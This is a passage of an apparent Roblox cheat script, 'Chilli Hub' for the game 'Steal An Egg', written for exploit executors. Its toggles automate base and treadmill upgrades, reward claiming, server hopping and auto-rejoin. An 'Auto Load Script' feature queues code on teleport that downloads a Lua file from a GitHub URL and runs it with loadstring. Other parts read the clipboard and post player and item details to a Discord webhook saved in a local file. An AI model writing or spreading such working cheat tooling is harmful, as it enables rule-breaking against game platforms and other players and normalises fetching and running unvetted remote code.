				table.clear(tbl15)
				v14 = nil
			end,
		})

		tbl12.AddWorker(fn14)
		local v15 = nil

		local function fn15()
			if not tbl5.ReadToggle(v15, false) then
				return false
			end
			local v16 = tbl12.SaveData()
			if not v16 then
				return false
			end

			local v17 = fn2(function()
				return ReplicatedStorage.Data.Bases
			end)

			local bases = type(v17) == "table" and v17.BASES or nil
			if type(bases) ~= "table" then
				return false
			end
			local n16 = tonumber(v16.BaseUpgradeLevel) or 0
			local ok = nil

			if type(v17.GetMaxBaseLevel) == "function" then
				local result
				ok, result = pcall(v17.GetMaxBaseLevel)
				ok = ok and tonumber(result) or nil
			end

			if ok and n16 >= ok then
				return false
			end
			local v18 = bases[n16 + 1]
			local num = type(v18) == "table" and tonumber(v18.Cost) or nil

			if num then
				num = (tonumber(v16.Money) or 0) >= num
			end

			if num then
				return tbl12.Fire("RE/Homestead/AskBaseTierRaise")
			end
			return false
		end

		v15 = v12:CreateToggle({
			Name = "Auto Upgrade Base",
			Note = "Automatically upgrade base when money is available",
			Default = false,
		})

		tbl12.AddWorker(fn15)
		local v16 = nil

		local function fn16()
			if not tbl5.ReadToggle(v16, false) then
				return false
			end
			local v17 = tbl12.SaveData()
			if not v17 then
				return false
			end

			local v18 = fn2(function()
				return ReplicatedStorage.Data.Treadmills
			end)

			if type(v18) ~= "table" or type(v18.GetByUpgradeLevel) ~= "function" then
				return false
			end
			local ok, result = pcall(v18.GetByUpgradeLevel, (tonumber(v17.TreadmillUpgradeLevel) or 0) + 1)
			if not ok or type(result) ~= "table" then
				return false
			end
			local id = result._id
			local huge = tonumber(result.Price) or math.huge
			local flag2 = type(id) == "string"

			if flag2 then
				flag2 = (tonumber(v17.Money) or 0) >= huge
			end

			if flag2 then
				local AskTierRaise, v19 = tbl12.Invoke("RF/Treadmill/AskTierRaise", id)
				return AskTierRaise and v19 ~= false
			end
			return false
		end

		v16 = v12:CreateToggle({
			Name = "Auto Upgrade Treadmill",
			Note = "Automatically upgrade treadmill when money is available",
			Default = false,
		})

		tbl12.AddWorker(fn16)
		local n16 = 15
		local v17 = nil
		local n17 = 15
		local now = os.clock()

		local function fn17()
			if not tbl5.ReadToggle(v17, false) then
				return false
			end
			local now2 = os.clock()
			n17 += now2 - now
			now = now2
			local v18 = tbl12.SaveData()
			local num = v18 and tonumber(v18.PendingOfflineMoney) or nil

			if num == nil then
				local PendingCheck, v19 = tbl12.Invoke("RF/AwayEarnings/PendingCheck")
				num = PendingCheck and v19 ~= false and v19 ~= nil and 1 or 0
			end

			local flag2 = false

			if num > 0 then
				local v19
				flag2, v19 = tbl12.Invoke("RF/AwayEarnings/AskCollect")
				flag2 = flag2 and v19 ~= false
			end

			if n16 <= n17 then
				n17 = 0
				local AskRedeemAll, v19 = tbl12.Invoke("RF/Codex/AskRedeemAll")
				flag2 = flag2 or AskRedeemAll and v19 ~= false
				tbl12.Invoke("RF/Codex/AskRedeemLimitedEgg")
			end

			return flag2
		end

		v17 = v12:CreateToggle({
			Name = "Auto Claim",
			Note = "Claim offline money & index rewards",
			Default = false,
			Callback = function()
				n17 = n16
			end,
		})

		tbl12.AddWorker(fn17)
	end

	tbl4.IndexClaimHandle = v12:CreateToggle({
		Name = "Auto Claim Index",
		Note = "Claim index rewards as soon as they unlock",
		Default = false,
		Callback = function()
			if type(tbl4.IndexClaimRestart) == "function" then
				tbl4.IndexClaimRestart()
			end
		end,
	})

	fn8 = function(arg, arg2)
		if type(v.Notify) == "function" then
			pcall(v.Notify, arg, arg2, 5)
		end
	end

	local v13
	v13 = v2:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
	local TeleportService
	TeleportService = game:GetService("TeleportService")
	local HttpService
	HttpService = game:GetService("HttpService")
	local GuiService
	GuiService = game:GetService("GuiService")

	do
		local function fn13()
			if type(queue_on_teleport) == "function" then
				return queue_on_teleport
			end

			if type(queueonteleport) == "function" then
				return queueonteleport
			end

			if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
				return syn.queue_on_teleport
			end

			if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
				return fluxus.queue_on_teleport
			end
			return nil
		end

		local function fn14(arg)
			pcall(function()
				TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
			end)

			if not arg then
				return true
			end
			local v14 = fn13()
			if not v14 then
				return false
			end

			if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
				if not pcall(v14, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player and not player.Character then
            player.CharacterAdded:Wait()
        end
    end)
    task.wait(1.5)
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
					return false
				end

				_G.__ChilliAutoLoadQueued = true
			end

			return true
		end

		local v14 = nil

		local function fn15()
			if v14 and tbl4.Toggle(v14, false) then
				fn14(true)
			end
		end

		v14 = v13:CreateToggle({
			Name = "Auto Load Script",
			Default = true,
			Callback = function(arg)
				local flag2 = arg == true

				if not fn14(flag2) and flag2 then
					task.defer(function()
						fn14(false)

						if v14 and type(v14.Set) == "function" then
							pcall(v14.Set, v14, false, false)
						end

						fn8("Auto Load Unavailable", "This executor does not support queue on teleport.")
					end)
				end
			end,
		})

		local str = "Least Players"
		local n16 = 10
		local n17 = 0
		local v15 = nil
		local tbl11 = {}
		local flag2 = false
		local n18 = 0
		local flag3 = false
		local v16 = nil
		local str2 = ""
		local n19 = 0
		local n20 = 60

		local function fn16(arg)
			n17 = 0
			v15 = nil

			if arg then
				tbl11[arg] = true
			end
		end

		pcall(function()
			TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
				if not v15 then
					return
				end
				fn16(v15)
				flag3 = true

				if not flag2 then
					fn8("Server Hop Failed", tostring(arg3 ~= "" and arg3 or arg2))
				end
			end)
		end)

		local function fn17(arg)
			local str3 = tostring(game.JobId or "")
			local tbl12 = {}
			local flag4 = arg == "Random"
			local str4 = arg == "Least Players" and "Asc" or "Desc"
			local n21 = flag4 and 3 or 6
			local nextPageCursor = nil

			for i = 1, n21 do
				local str5 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str4)

				if nextPageCursor and nextPageCursor ~= "" then
					str5 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
				end

				local ok, result = pcall(function()
					return HttpService:JSONDecode(game:HttpGet(str5))
				end)

				if not ok or type(result) ~= "table" then
					return tbl12, false
				end
				local v17 = ipairs
				local data = result.data or {}

				for _, v18 in v17(data) do
					local str6 = tostring(v18.id or "")
					local huge = tonumber(v18.playing) or math.huge
					local n22 = tonumber(v18.maxPlayers) or 0

					if str6 ~= "" and str6 ~= str3 and huge < n22 then
						tbl12[#tbl12 + 1] = { Id = str6, Playing = huge, Room = n22 - huge }
					end
				end

				if #tbl12 > 0 and not flag4 then
					break
				end
				nextPageCursor = result.nextPageCursor
				if not nextPageCursor or nextPageCursor == "" then
					break
				end
			end

			return tbl12, true
		end

		local function serverHop(arg)
			local v17

			if v16 and str2 == arg and os.clock() - n19 < n20 then
				v17 = v16
			else
				local v18
				v17, v18 = fn17(arg)
				if not v18 then
					return "fetch"
				end
				v16 = v17
				str2 = arg
				n19 = os.clock()
			end

			local function fn18(arg2)
				local tbl12 = {}

				for _, v18 in ipairs(v17) do
					if not tbl11[v18.Id] and v18.Room >= arg2 then
						tbl12[#tbl12 + 1] = v18
					end
				end

				return tbl12
			end

			local v18 = fn18(2)

			if #v18 == 0 then
				v18 = fn18(1)
			end

			if #v18 == 0 and next(tbl11) ~= nil then
				table.clear(tbl11)
				v18 = fn18(1)
			end

			if #v18 == 0 then
				fn16(nil)
				v16 = nil
				return "empty"
			end

			local id

			if arg == "Random" then
				id = v18[math.random(1, #v18)].Id
			else
				table.sort(v18, function(arg2, arg3)
					if arg == "Least Players" then
						return arg2.Playing < arg3.Playing
					end
					return arg2.Playing > arg3.Playing
				end)

				id = v18[1].Id
			end

			flag3 = false
			v15 = id
			n17 = os.clock() + n16
			pcall(fn15)

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
			end) then
				fn16(id)
				return "failed"
			end

			local n21 = os.clock() + n16

			while os.clock() < n21 do
				if flag3 then
					return "denied"
				end
				task.wait(0.25)
			end

			return "waiting"
		end

		tbl4.ServerHop = serverHop

		v13:CreateDropdown({
			Name = "Server Hop Mode",
			Options = { "Most Players", "Random", "Least Players" },
			Default = "Least Players",
			Callback = function(arg)
				str = tostring(arg or "Least Players")
			end,
		})

		v13:CreateButton({
			Name = "Server Hop",
			ButtonText = "Hop",
			Callback = function()
				n18 += 1
				local v17 = n18

				task.spawn(function()
					flag2 = true
					local n21 = 0

					while v17 == n18 do
						n21 += 1
						local v18 = serverHop(str)

						if not (v18 == "waiting" or v17 ~= n18) then
							if v18 == "empty" then
								v16 = nil
								table.clear(tbl11)
							end

							if n21 % 10 == 0 then
								fn8("Server Hop", string.format("Every server was full so far, %d tries.", n21))
							end

							task.wait(v18 == "fetch" and 1 or 0.1)
							continue
						end

						break
					end

					if v17 == n18 then
						flag2 = false
					end
				end)
			end,
		})
	end

	do
		local n16 = 8
		local n17 = 0
		local str = ""
		local v14 = nil

		local function fn13()
			return os.clock() < n17
		end

		local function fn14(arg)
			n17 = arg and os.clock() + n16 or 0
		end

		local function fn15(arg)
			local match = tostring(arg or ""):match("^%s*(.-)%s*$")
			return match:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or match
		end

		local function fn16()
			local v15 = str
			local v16 = str

			if v14 then
				local ok, result = pcall(function()
					local controller = v14._controller
					return controller and controller.GetValue and controller.GetValue()
				end)

				if ok and type(result) == "string" and result ~= "" then
					v16 = result
				else
					for _, v17 in ipairs({ "Get", "GetValue", "GetText" }) do
						local ok2, result2 = pcall(function()
							return v14[v17]
						end)

						if ok2 and type(result2) == "function" then
							local ok3, result3 = pcall(result2, v14)
							if ok3 and type(result3) == "string" and result3 ~= "" then
								v15 = result3
								break
							end
						end
					end

					v16 = v15
				end
			end

			local v17 = fn15(v16)

			if v17 == "" then
				local ok, result = pcall(function()
					local v18 = getclipboard or readclipboard or getrbxclipboard
					return type(v18) == "function" and v18() or nil
				end)

				if ok and type(result) == "string" then
					v17 = fn15(result)
				end
			end

			return v17
		end

		local function fn17(arg)
			if not v14 then
				return
			end

			pcall(function()
				local controller = v14._controller

				if controller and controller.SetValue then
					controller.SetValue(arg, false)
				end
			end)

			str = fn15(arg)
		end

		local function fn18(arg)
			fn14(true)
			pcall(AutoLoadBeforeTeleport)

			if not pcall(function()
				if game.JobId ~= "" then
					TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
				else
					TeleportService:Teleport(game.PlaceId, localPlayer)
				end
			end) then
				fn14(false)
				fn8(arg, "Roblox could not rejoin the server.")
			end
		end

		pcall(function()
			TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
				if not fn13() then
					return
				end
				fn14(false)
				fn8("Teleport Failed", tostring(arg3 ~= "" and arg3 or arg2))
			end)
		end)

		v14 = v13:CreateInput({
			Name = "Job ID",
			Placeholder = "Paste a server Job ID...",
			Default = "",
			MaxLength = 100,
			Callback = function(arg)
				str = fn15(arg)
			end,
		})

		if v14 then
			v14._configIgnored = true

			if v14.State and not v14.State._registered then
				v14.State._configIgnored = true
			end
		end

		v13:CreateButton({
			Name = "Join Job ID",
			ButtonText = "Join",
			Callback = function()
				if fn13() then
					fn8("Join Job ID Failed", "A teleport is already running, try again shortly.")
					return
				end
				local v15 = fn16()
				if v15 == "" then
					fn8("Join Job ID Failed", "Paste a valid Job ID first.")
					return
				end
				fn14(true)
				pcall(AutoLoadBeforeTeleport)

				if not pcall(function()
					TeleportService:TeleportToPlaceInstance(game.PlaceId, v15, localPlayer)
				end) then
					fn14(false)
					fn8("Join Job ID Failed", "Roblox could not join that server.")
				end
			end,
		})

		v13:CreateButton({
			Name = "Copy Current Job ID",
			ButtonText = "Copy",
			Callback = function()
				local str2 = tostring(game.JobId or "")
				fn17(str2)
				local v15 = setclipboard or toclipboard
				fn8((type(v15) == "function" and pcall(v15, str2) or false) and "Job ID Copied" or "Job ID Shown", str2)
			end,
		})

		v13:CreateButton({
			Name = "Rejoin Server",
			ButtonText = "Rejoin",
			Callback = function()
				if fn13() then
					fn8("Rejoin Failed", "A teleport is already running, try again shortly.")
					return
				end
				fn18("Rejoin Failed")
			end,
		})

		local tbl11 = { Option = nil, Fired = false, TeleportingAt = 0 }

		local function fn19()
			local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
			robloxPromptGui = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
			return robloxPromptGui ~= nil and robloxPromptGui:FindFirstChild("ErrorPrompt") ~= nil
		end

		pcall(function()
			local connection = localPlayer.OnTeleport:Connect(function(arg)
				if arg == Enum.TeleportState.Failed then
					tbl11.TeleportingAt = 0
				else
					tbl11.TeleportingAt = os.clock()
				end
			end)

			fn4(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end)

		tbl11.Option = v13:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })

		local function fn20(arg)
			if tbl11.Fired or tbl11.Option == nil or not tbl4.Toggle(tbl11.Option, false) or fn13() then
				return
			end
			local flag2 = tbl11.TeleportingAt > 0

			if flag2 then
				local teleportingAt = tbl11.TeleportingAt
				flag2 = os.clock() - teleportingAt < 60
			end

			if flag2 then
				return
			end
			local v15 = string.lower(tostring(arg or ""))
			if v15 == "" or string.find(v15, "teleport", 1, true) then
				return
			end
			local errorCode = nil

			pcall(function()
				errorCode = GuiService:GetErrorCode()
			end)

			if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(v15, "banned", 1, true) or string.find(v15, "same account", 1, true) then
				return
			end
			tbl11.Fired = true
			local placeId = game.PlaceId
			local str2 = tostring(game.JobId or "")
			local flag3 = string.find(v15, "shut", 1, true) ~= nil or string.find(v15, "no longer", 1, true) ~= nil or string.find(v15, "closed", 1, true) ~= nil
			pcall(AutoLoadBeforeTeleport)
			fn8("Auto Rejoin", flag3 and "Server closed, joining another one." or "Disconnected, rejoining now.")

			task.spawn(function()
				local n18 = 0

				while true do
					n18 += 1
					local flag4 = not flag3 and str2 ~= "" and n18 <= 2

					pcall(function()
						if flag4 then
							TeleportService:TeleportToPlaceInstance(placeId, str2, localPlayer)
						else
							TeleportService:Teleport(placeId, localPlayer)
						end
					end)

					task.wait(flag4 and 4 or 5)
				end
			end)
		end

		pcall(function()
			local connection = GuiService.ErrorMessageChanged:Connect(function(arg)
				task.wait(0.3)

				if fn19() then
					fn20(arg)
				end
			end)

			fn4(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end)

		task.spawn(function()
			local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
			local promptOverlay = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
			if not promptOverlay then
				return
			end

			local connection = promptOverlay.ChildAdded:Connect(function(child)
				if child.Name ~= "ErrorPrompt" then
					return
				end
				task.wait(0.2)
				local str2 = ""

				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
						str2 = descendant.Text
					end
				end

				if str2 == "" then
					pcall(function()
						str2 = GuiService:GetErrorMessage()
					end)
				end

				fn20(str2 ~= "" and str2 or "disconnected")
			end)

			fn4(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end)
	end

	do
		local AssetService = game:GetService("AssetService")
		local request_ = syn and syn.request
		local request_2

		if request_ then
			request_2 = request_
		else
			request_2 = http and http.request
		end

		request_2 = request_2 or http_request or request

		local tbl11 = {
			Url = "",
			Stolen = false,
			PingEveryone = false,
			Queue = {},
			Sending = false,
			Notified = {},
			Icons = {},
			Pngs = {},
			Crc = {},
			Known = nil,
			Carry = nil,
			Avatar = nil,
			Disposed = false,
			Path = "ChilliLibrary/SAE_Webhook.txt",
			Saved = "",
			LoadedAt = os.clock(),
			Input = nil,
			Dot = "  " .. utf8.char(183) .. "  ",
			MaxSide = 200,
			Logo = "https://media.discordapp.net/attachments/1181785068637790221/1551685385665380432/chilli.png?ex=6ab2df20&is=6ab18da0&hm=5ca4b16854493c689912c068c29354752a0f2ea0490d5b22cbd9acf7d26ed7eb&=&format=webp&quality=lossless",
			Emoji = {
				Value = "<:sae_value:1551645680718581871>",
				Size = "<:sae_size:1551645444285800558>",
				Mutation = "<:sae_mutation:1551677914146275478>",
				Area = "<:sae_area:1551675973328441416>",
			},
		}

		pcall(function()
			if type(readfile) ~= "function" then
				return
			end

			if type(isfile) == "function" and not isfile(tbl11.Path) then
				return
			end
			local v14 = string.gsub(tostring(readfile(tbl11.Path) or ""), "%s", "")
			tbl11.Saved = v14
			tbl11.Url = v14
		end)

		for i = 0, 255 do
			local v14 = i

			for i2 = 1, 8 do
				if bit32.band(v14, 1) == 1 then
					v14 = bit32.bxor(3988292384, bit32.rshift(v14, 1))
				else
					v14 = bit32.rshift(v14, 1)
				end
			end

			tbl11.Crc[i] = v14
		end

		local function fn13(arg)
			if type(arg) ~= "string" then
				return false
			end

			for _, v14 in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
				if string.match(arg, "^https://" .. v14 .. "/api/webhooks/%d+/[%w%-_]+$") then
					return true
				end
			end

			return false
		end

		local function fn14(arg)
			if type(request_2) ~= "function" then
				return nil
			end
			local ok, result = pcall(request_2, { Url = arg, Method = "GET" })
			if not ok or type(result) ~= "table" or tonumber(result.StatusCode) ~= 200 then
				return nil
			end
			local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body))
			return ok2 and result2 or nil
		end

		local function fn15(arg, arg2)
			local flag2 = type(arg) == "table" and type(arg.data) == "table" and arg.data[1] or nil
			if type(flag2) ~= "table" or flag2.state ~= "Completed" or type(flag2.imageUrl) ~= "string" or flag2.imageUrl == "" then
				return nil
			end

			if arg2 and not string.find(flag2.imageUrl, "/Image/", 1, true) then
				return nil
			end
			return flag2.imageUrl
		end

		local function fn16(arg)
			if tbl11.Icons[arg] == nil then
				tbl11.Icons[arg] = fn15(fn14("https://thumbnails.roblox.com/v1/assets?assetIds=" .. arg .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
			end

			return tbl11.Icons[arg] or nil
		end

		local function fn17()
			if tbl11.Avatar == nil then
				tbl11.Avatar = fn15(fn14("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
			end

			return tbl11.Avatar or nil
		end

		local function fn18(arg, arg2, arg3)
			local crc = tbl11.Crc
			local n16 = 4294967295

			for i = arg2, arg3 do
				local rshift = bit32.rshift
				n16 = bit32.bxor(crc[bit32.band(bit32.bxor(n16, buffer.readu8(arg, i)), 255)], rshift(n16, 8))
			end

			return bit32.bxor(n16, 4294967295)
		end

		local function fn19(arg, arg2, arg3)
			local n16 = arg2 * 4 + 1
			local n17 = n16 * arg3
			local n18 = 2 + math.ceil(n17 / 65535) * 5 + n17 + 4
			local v14 = buffer.create(45 + n18 + 12)
			local n19 = 0

			local function fn20(arg4)
				buffer.writeu8(v14, n19, arg4)
				n19 += 1
			end

			local function fn21(arg4)
				fn20(bit32.band(bit32.rshift(arg4, 24), 255))
				fn20(bit32.band(bit32.rshift(arg4, 16), 255))
				fn20(bit32.band(bit32.rshift(arg4, 8), 255))
				fn20(bit32.band(arg4, 255))
			end

			local function fn22(arg4, arg5, arg6, arg7)
				fn20(arg4)
				fn20(arg5)
				fn20(arg6)
				fn20(arg7)
			end

			for _, v15 in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
				fn20(v15)
			end

			fn21(13)
			fn22(73, 72, 68, 82)
			fn21(arg2)
			fn21(arg3)
			fn20(8)
			fn20(6)
			fn20(0)
			fn20(0)
			fn20(0)
			fn21(fn18(v14, n19, n19 - 1))
			local v15 = buffer.create(n17)

			for i = 0, arg3 - 1 do
				buffer.writeu8(v15, i * n16, 0)
				buffer.copy(v15, i * n16 + 1, arg, i * arg2 * 4, arg2 * 4)
			end

			fn21(n18)
			local v16 = n19
			fn22(73, 68, 65, 84)
			fn20(120)
			fn20(1)
			local n20 = 0

			while n20 < n17 do
				local n21 = math.min(65535, n17 - n20)
				fn20(n20 + n21 >= n17 and 1 or 0)
				fn20(bit32.band(n21, 255))
				fn20(bit32.rshift(n21, 8))
				local v17 = bit32.band(bit32.bnot(n21), 65535)
				fn20(bit32.band(v17, 255))
				fn20(bit32.rshift(v17, 8))
				buffer.copy(v14, n19, v15, n20, n21)
				n19 += n21
				n20 += n21
			end

			local n21 = 1
			local n22 = 0

			for i = 0, n17 - 1 do
				n21 = (n21 + buffer.readu8(v15, i)) % 65521
				n22 = (n22 + n21) % 65521
			end

			fn21(n22 * 65536 + n21)
			fn21(fn18(v14, v16, n19 - 1))
			fn21(0)
			fn22(73, 69, 78, 68)
			fn21(fn18(v14, n19, n19 - 1))
			return buffer.tostring(v14)
		end

		local function fn20(arg)
			if tbl11.Pngs[arg] ~= nil then
				return tbl11.Pngs[arg] or nil
			end

			local ok, result = pcall(function()
				local v14 = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. arg))
				local size = v14.Size
				local n16 = math.floor(size.X)
				local n17 = math.floor(size.Y)
				local v15 = v14:ReadPixelsBuffer(Vector2.zero, size)

				pcall(function()
					v14:Destroy()
				end)

				local n18 = math.min(1, tbl11.MaxSide / math.max(n16, n17))
				local n19 = math.max(1, math.floor(n16 * n18))
				local n20 = math.max(1, math.floor(n17 * n18))
				local v16 = buffer.create(n19 * n20 * 4)

				for i = 0, n20 - 1 do
					local n21 = math.min(n17 - 1, math.floor(i / n18))

					for i2 = 0, n19 - 1 do
						buffer.copy(v16, (i * n19 + i2) * 4, v15, (n21 * n16 + math.min(n16 - 1, math.floor(i2 / n18))) * 4, 4)
					end
				end

				return fn19(v16, n19, n20)
			end)

			tbl11.Pngs[arg] = ok and type(result) == "string" and result or false
			return tbl11.Pngs[arg] or nil
		end

		local function fn21(arg, arg2)
			if arg2 then
				return 13686498
			end

			if typeof(arg) ~= "Color3" then
				return 5793266
			end
			return math.floor(arg.R * 255 + 0.5) * 65536 + math.floor(arg.G * 255 + 0.5) * 256 + math.floor(arg.B * 255 + 0.5)
		end

		local function fn22(arg)
			local tbl12 = {}

			if type(arg) == "table" then
				for _, v14 in ipairs(arg) do
					tbl12[#tbl12 + 1] = fn7(v14)
				end
			end

			return #tbl12 > 0 and table.concat(tbl12, ", ") or "None"
		end

		local function fn23(arg)
			local areas = tbl.Areas
			local directory = type(areas) == "table" and (areas.Directory or areas) or nil
			local str = tostring(arg or "")
			local flag2 = type(directory) == "table" and str ~= "" and directory[str] or nil
			if type(flag2) == "table" then
				return tostring(flag2.DisplayName or str)
			end
			return str ~= "" and str or "Field"
		end

		local function fn24(arg, arg2, arg3, arg4, arg5, arg6)
			local str = tostring(arg2)
			local v14 = tbl6.AssetInfo(str)
			local n16 = tonumber(arg3) or 1
			arg4 = type(arg4) == "table" and arg4 or {}
			local v15 = tbl6.Income(v14, n16, arg4)
			local dot = tbl11.Dot
			local str2 = string.format("x%.2f", n16)
			local eggRecords = tbl.EggRecords

			if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
				local ok, result = pcall(eggRecords.WeightKgForScale, str, n16)

				if ok and tonumber(result) then
					str2 ..= dot .. tbl6.FormatWeight(result)
				end
			end

			local emoji = tbl11.Emoji
			local tbl12 = {}
			local str3 = "**" .. tostring(v14.Name) .. "**" .. dot .. tostring(v14.Rarity)
			local str4 = emoji.Value .. " **Value:** $" .. tbl6.FormatRate(v15)
			local str5 = emoji.Size .. " **Size:** " .. str2
			local str6 = emoji.Mutation .. " **Mutation:** " .. fn22(arg4)
			local str7 = emoji.Area .. " **Area:** " .. fn23(arg5)
			tbl12[1] = str3
			tbl12[2] = str4
			tbl12[3] = str5
			tbl12[4] = str6
			tbl12[5] = str7

			local tbl13 = {
				author = { name = localPlayer.DisplayName, icon_url = fn17() },
				title = arg,
				description = table.concat(tbl12, "\n"),
				color = fn21(v14.Color, string.upper(tostring(v14.Rarity)) == "SECRET"),
				footer = { text = "Chilli Hub" .. dot .. "Steal An Egg", icon_url = tbl11.Logo },
				timestamp = DateTime.now():ToIsoDate(),
			}

			local tbl14 = { username = "Chilli Hub", avatar_url = tbl11.Logo, embeds = { tbl13 } }
			local icon = v14.Icon

			if arg6 then
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag2 = type(directory) == "table" and directory[str] or nil
				local egg = type(flag2) == "table" and type(flag2.Egg) == "table" and flag2.Egg or nil

				if egg and egg.Icon ~= nil then
					icon = egg.Icon
				end
			end

			local num = tonumber(string.match(tostring(icon or ""), "(%d+)"))
			local v16 = num and fn20(num) or nil
			local flag2 = num and not v16 and fn16(num) or nil

			if v16 then
				tbl13.thumbnail = { url = "attachment://egg.png" }
				tbl14.attachments = { { id = 0, filename = "egg.png" } }
			elseif flag2 then
				tbl13.thumbnail = { url = flag2 }
			end

			return tbl14, v16
		end

		local function fn25()
			if tbl11.Sending then
				return
			end
			tbl11.Sending = true

			task.spawn(function()
				while #tbl11.Queue > 0 and not tbl11.Disposed do
					local v14 = table.remove(tbl11.Queue, 1)

					if fn13(tbl11.Url) and type(request_2) == "function" then
						local tbl12 = { Url = tbl11.Url, Method = "POST" }

						if v14.Png then
							local str = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
							tbl12.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str }
							local concat = table.concat
							local tbl13 = {}
							local png = v14.Png
							local json = HttpService:JSONEncode(v14.Payload)
							tbl13[1] = "--"
							tbl13[2] = str
							tbl13[3] = "\r\n"
							tbl13[4] = "Content-Disposition: form-data; name=\"payload_json\"\r\n"
							tbl13[5] = "Content-Type: application/json\r\n\r\n"
							tbl13[6] = json
							tbl13[7] = "\r\n"
							tbl13[8] = "--"
							tbl13[9] = str
							tbl13[10] = "\r\n"
							tbl13[11] = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n"
							tbl13[12] = "Content-Type: image/png\r\n\r\n"
							tbl13[13] = png
							tbl13[14] = "\r\n"
							tbl13[15] = "--"
							tbl13[16] = str
							tbl13[17] = "--\r\n"
							tbl12.Body = concat(tbl13)
						else
							tbl12.Headers = { ["Content-Type"] = "application/json" }
							tbl12.Body = HttpService:JSONEncode(v14.Payload)
						end

						local ok, result = pcall(request_2, tbl12)
						ok = ok and type(result) == "table" and tonumber(result.StatusCode) or nil

						if ok == 429 and v14.Tries < 3 then
							v14.Tries = v14.Tries + 1
							table.insert(tbl11.Queue, 1, v14)
							task.wait(3)
						elseif ok ~= 200 and ok ~= 204 and v14.Png then
							v14.Png = nil
							v14.Payload.attachments = nil
							local flag2 = type(v14.Payload.embeds) == "table" and v14.Payload.embeds[1] or nil

							if flag2 then
								flag2.thumbnail = nil
							end

							table.insert(tbl11.Queue, 1, v14)
						end
					end

					task.wait(1.2)
				end

				tbl11.Sending = false
			end)
		end

		local function fn26()
			return type(request_2) == "function" and fn13(tbl11.Url)
		end

		local function fn27(arg, arg2)
			if #tbl11.Queue >= 20 then
				table.remove(tbl11.Queue, 1)
			end

			if tbl11.PingEveryone and type(arg) == "table" then
				arg.content = "@everyone"
				arg.allowed_mentions = { parse = { "everyone" } }
			end

			table.insert(tbl11.Queue, { Payload = arg, Png = arg2, Tries = 0 })
			fn25()
		end

		local eggState = tbl.EggState
		local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

		if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
			local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
				if type(arg) ~= "table" then
					return
				end

				if arg.IsCarrying then
					tbl11.Carry = {
						Category = tostring(arg.AssetCategory),
						Uid = tostring(arg.Uid),
						Area = tostring(arg.AreaId or "Field"),
						EndedAt = nil,
					}
				elseif tbl11.Carry then
					tbl11.Carry.EndedAt = os.clock()
				end
			end)

			if ok and result then
				fn4(function()
					pcall(function()
						result:Disconnect()
					end)
				end)
			end
		end

		fn4(function()
			tbl11.Disposed = true
		end)

		task.spawn(function()
			while not tbl11.Disposed do
				local flag2 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local flag3 = false
				local result = nil

				if flag2 then
					flag3, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				end

				if flag3 and type(result) == "table" then
					local known = tbl11.Known
					local tbl12 = {}
					local known2 = {}

					for k, v14 in pairs(result) do
						local str = tostring(k)
						known2[str] = true

						if known and not known[str] and type(v14) == "table" then
							tbl12[#tbl12 + 1] = { Uid = str, Record = v14 }
						end
					end

					tbl11.Known = known2
					local carry = tbl11.Carry

					if tbl11.Stolen and carry and #tbl12 > 0 then
						for _, v14 in ipairs(tbl12) do
							local record = v14.Record
							local flag4 = carry.EndedAt == nil

							if not flag4 then
								local endedAt = carry.EndedAt
								flag4 = os.clock() - endedAt < 20
							end

							if flag4 then
								flag4 = v14.Uid == carry.Uid

								if not flag4 then
									local category = carry.Category
